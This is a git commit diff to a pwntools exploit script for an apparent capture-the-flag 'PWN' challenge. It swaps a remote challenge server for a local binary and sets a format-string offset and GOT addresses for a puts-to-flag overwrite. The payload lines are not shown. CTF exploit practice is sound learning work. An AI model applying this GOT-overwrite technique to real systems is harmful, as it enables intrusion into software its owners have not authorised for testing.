46a695b8719afea069d8fdba2aa2e1a2b4dbb72b
Infrar3dd <120894421+Infrar3dd@users.noreply.github.com>
2025-09-22 17:12:51 +0300

    Update func2_exp.py

--- PWN/Func/func2_exp.py
+++ PWN/Func/func2_exp.py
@@ -1,14 +1,12 @@
 from pwn import *
 
-HOST = "178.216.122.15"
-PORT = 43459
 
 offset = 7
 GOT_PUTS = 0x804c010
 GOT_FLAG = 0x80491a6
 
 context(arch='i386', os='linux')
-p = remote(HOST, PORT)
+p = process('./func')
 
 p.recvuntil(b'Enter your name: ')
 p.clean()
